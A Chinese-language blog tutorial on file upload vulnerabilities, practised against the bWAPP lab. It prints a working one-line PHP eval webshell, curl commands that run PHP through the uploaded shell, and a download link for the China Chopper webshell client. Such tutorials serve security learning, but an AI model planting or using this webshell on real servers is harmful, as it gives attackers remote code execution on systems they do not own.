---
title: '文件上传漏洞[一]'
tags:
  - Web安全
categories:
  - 文件上传漏洞
summary: 文件上传漏洞随笔
img: /images/web安全/1.jpg
abbrlink: c9a
date: 2021-03-15 13:00:00
updated: 2021-03-15 13:00:00
---






## 一、文件上传漏洞概述

   
   
  文件上传（File Upload）是大部分Web应用都具备的功能，例如用户上传附件、改头像、分享图片等。

文件上传漏洞是在开发者没有做充足验证（包括前端，后端）情况下，允许用户上传恶意文件，这里上传的文件可以是木马、病毒、恶意脚本或者Webshell等。


-----






## 二、编辑木马文件并上传
### 1.eval函数



eval( string $code)

把字符串 code 作为PHP代码执行。函数eval()语言结构允许执行任意 PHP 代码。code为 需要被执行的字符串 。

代码执行的作用域是调用 eval() 处的作用域。因此，eval() 里任何的变量定义、修改，都会在函数结束后被保留。

----

### 2.PHP一句话木马





	<?php @eval($_POST['hacker']); ?>

新建文本文件写入PHP一句话木马，并将txt后缀改为php.

![](https://img-blog.csdnimg.cn/20210314115226333.png)


----

### 3.上传PHP文件
登录bwapp靶场后选择Unrestricted File Upload,文件上传漏洞上传文件，上传后可以看到路径为   靶场路径+/images/shell.php

![](https://img-blog.csdnimg.cn/20210314115551830.png)
![](https://img-blog.csdnimg.cn/20210314115616674.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjgxNTMy,size_16,color_FFFFFF,t_70)

----

### 4.webshell执行命令
在cmd执行

	curl -d "hacker=echo get_current_user();" 靶场路径/images/shell.php
	curl -d "hacker=echo getcwd();" 靶场路径/images/shell.php


get_current_user — 获取当前 PHP 脚本所有者名称

getcwd — 取得当前工作目录。
![](https://img-blog.csdnimg.cn/20210314115808496.png)


----


### 5.使用中国菜刀连接
下载链接：https://github.com/raddyfiy/caidao-official-version

打开软件后，右键添加SHELL连接即可。

![](https://img-blog.csdnimg.cn/20210314120042500.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjgxNTMy,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20210314120010248.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjgxNTMy,size_16,color_FFFFFF,t_70)

----


### 6.不同语言一句话木马
![](https://img-blog.csdnimg.cn/20210314120109482.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjgxNTMy,size_16,color_FFFFFF,t_70)


----